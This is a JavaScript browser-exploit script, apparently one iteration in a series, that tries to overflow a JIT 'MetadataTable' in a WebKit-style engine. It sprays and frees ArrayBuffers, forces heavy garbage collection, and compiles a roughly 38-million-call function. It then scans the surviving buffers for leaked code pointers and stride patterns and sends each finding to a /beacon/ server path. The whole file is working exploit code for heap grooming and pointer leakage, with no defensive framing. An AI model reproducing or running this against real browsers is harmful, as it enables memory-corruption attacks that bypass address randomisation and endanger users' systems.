// p150i — MetadataTable overflow: aggressive Swiss cheese with heavy GC
//
// p150h failed because freed AB backing stores weren't reclaimed by GC
// before the metadata allocation. Fix: MASSIVE GC pressure to force
// collection of freed ABs, then compile.
//
// Also: allocate MORE ABs to span a wider address range, increasing
// the chance that some are at addresses higher than the metadata.
//
// Beacon prefix: V150I-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150I-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // Phase 1: Spray 400 x 100KB ABs (40MB total, spans ~10 marge pages)
  var TOTAL = 400;
  var BUF_SIZE = 100096;
  var sprays = new Array(TOTAL);
  var views = new Array(TOTAL);
  for (var i = 0; i < TOTAL; i++) {
    sprays[i] = new ArrayBuffer(BUF_SIZE);
    views[i] = new Uint32Array(sprays[i]);
  }
  BS('SPRAY-' + TOTAL);

  // Phase 2: Free even-indexed ABs (200 holes)
  for (var i = 0; i < TOTAL; i += 2) {
    sprays[i] = null;
    views[i] = null;
  }
  BS('FREED-200');

  // Phase 3: ULTRA AGGRESSIVE GC — force multiple GC cycles
  // Strategy: allocate 500MB in rounds, each round's garbage becomes GC pressure
  for (var round = 0; round < 8; round++) {
    var tmp = [];
    for (var g = 0; g < 100; g++) {
      try { tmp.push(new ArrayBuffer(512 * 1024)); } catch(e) { break; }
    }
    tmp = null;
  }
  // More pressure with small objects (triggers Eden GC)
  for (var g = 0; g < 200000; g++) {
    var obj = {a: g, b: [g]};
  }
  // Final large pressure
  for (var round = 0; round < 3; round++) {
    var tmp2 = [];
    for (var g = 0; g < 50; g++) {
      try { tmp2.push(new ArrayBuffer(1024 * 1024)); } catch(e) { break; }
    }
    tmp2 = null;
  }
  BS('GC-DONE');

  // Verify remaining ABs are still zeroed
  var preNZ = 0;
  for (var i = 1; i < TOTAL; i += 2) {
    if (!views[i]) { preNZ = -1; break; }
    for (var j = 0; j < 50; j++) {
      if (views[i][j] !== 0) preNZ++;
    }
  }
  BS('PRE-NZ-' + preNZ);

  // Check how many odd ABs survived GC
  var survived = 0;
  for (var i = 1; i < TOTAL; i += 2) {
    if (sprays[i] && sprays[i].byteLength > 0) survived++;
  }
  BS('ALIVE-' + survived);

  // Phase 4: Build 38M-call function (DON'T execute!)
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));
    if (!window.__bigOk) return;

    // Phase 5: Scan ALL remaining ABs for non-zero data
    BS('SCAN-START');
    var hitBufs = 0;
    var totalNZ = 0;
    var reported = 0;

    for (var i = 1; i < TOTAL; i += 2) {
      if (!sprays[i] || !views[i]) continue;
      var v = views[i];
      var nz = 0;
      for (var j = 0; j < v.length; j++) {
        if (v[j] !== 0) nz++;
      }
      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (reported < 40) {
          var count = 0;
          for (var k = 0; k < v.length && count < 3; k++) {
            if (v[k] !== 0) {
              BS('L-b' + i + '-o' + (k*4) + '-' + v[k].toString(16));
              count++;
              reported++;
            }
          }
        }
      }
    }
    BS('SCAN-hits' + hitBufs + '-nz' + totalNZ);

    // Phase 6: If hits found, look for code pointer pattern
    // m_slowPathCallDestination at byte +24 within each 112-byte entry
    // Repeating pattern: same 8-byte value every 112 bytes
    if (hitBufs > 0) {
      var ptrs = 0;
      for (var i = 1; i < TOTAL && ptrs < 10; i += 2) {
        if (!sprays[i]) continue;
        var u8 = new Uint8Array(sprays[i]);
        for (var j = 0; j < u8.length - 7 && ptrs < 10; j += 8) {
          var hi16 = (u8[j+7] << 8) | u8[j+6];
          var mid = (u8[j+5] << 8) | u8[j+4];
          if (hi16 === 0 && mid !== 0) {
            var hex = '';
            for (var x = 7; x >= 0; x--) hex += ('0' + u8[j+x].toString(16)).slice(-2);
            BS('PTR-b' + i + '-o' + j + '-' + hex);
            ptrs++;
          }
        }
      }
      BS('PTRS-' + ptrs);

      // Check for 112-byte stride repetition
      for (var i = 1; i < TOTAL; i += 2) {
        if (!sprays[i]) continue;
        var u8 = new Uint8Array(sprays[i]);
        // Find first non-zero 8-byte aligned position
        var firstNZ = -1;
        for (var j = 0; j < u8.length - 7; j += 8) {
          if (u8[j] || u8[j+1] || u8[j+2] || u8[j+3] ||
              u8[j+4] || u8[j+5] || u8[j+6] || u8[j+7]) {
            firstNZ = j;
            break;
          }
        }
        if (firstNZ < 0) continue;

        // Check if same value repeats at +112
        var match112 = 0;
        for (var off = firstNZ; off + 112 < u8.length; off += 112) {
          var same = true;
          for (var b = 0; b < 8; b++) {
            if (u8[off + b] !== u8[off + 112 + b]) { same = false; break; }
          }
          if (same) match112++;
        }
        BS('STRIDE-b' + i + '-start' + firstNZ + '-matches' + match112);
        break;
      }
    }

    BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
